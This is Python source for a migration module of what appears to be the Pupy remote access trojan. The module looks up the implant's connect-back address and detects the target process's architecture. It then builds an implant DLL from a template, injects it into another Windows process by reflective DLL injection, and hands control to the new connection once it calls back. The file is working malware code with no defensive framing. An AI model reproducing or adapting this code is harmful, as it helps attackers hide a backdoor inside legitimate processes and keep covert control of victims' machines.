import pupygen
import time
import rpyc
from pupygen import parse_scriptlets

def has_proc_migrated(client, pid):
    for c in client.pupsrv.clients:
        if all([True for x in c.desc if x in ["hostname", "platform", "release", "version", "macaddr"] and client.desc[x]==c.desc[x]]):
            if int(c.desc["pid"])==pid:
                return c
    return None

def migrate(module, pid, keep=False, timeout=30):
    module.client.load_package("pupwinutils.processes")
    dllbuf=b""
    isProcess64bits=False
    module.success("looking for configured connect back address ...")
    try:
        res=module.client.conn.modules['pupy'].get_connect_back_host()
        host, port=res.rsplit(':',1)
        module.success("address configured is %s:%s ..."%(host,port))
    except:
        if not keep:
            module.error("launcher doesn't support connect back host information, disable keep")
            keep = True

    module.success("looking for process %s architecture ..."%pid)
    arch = None
    if module.client.conn.modules['pupwinutils.processes'].is_process_64(pid):
        isProcess64bits=True
        arch='x64'
        module.success("process is 64 bits")
    else:
        arch='x86'
        module.success("process is 32 bits")
    conf=module.client.get_conf()

    #uncomment this to debug pupy injected DLL loading
    #conf['offline_script']=parse_scriptlets(["stdout_to_file,path=C:\\pupy.log"], debug=False)

    dllbuff, filename, _ = pupygen.generate_binary_from_template(
        conf, 'windows',
        arch=arch, shared=True
    )
    module.success("Template: {}".format(filename))

    module.success("injecting DLL in target process %s ..."%pid)
    module.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
    module.success("DLL injected !")

    if keep:
        return

    module.success("waiting for a connection from the DLL ...")
    time_end = time.time() + timeout
    c = False
    while True:
        c = has_proc_migrated(module.client, pid)
        if c:
            module.success("got a connection from migrated DLL !")
            c.pupsrv.move_id(c, module.client)
            module.client.conn.exit()
            module.success("migration completed")
            break

        elif time.time() > time_end:
            module.error("migration timed out !")
            break

        time.sleep(0.5)
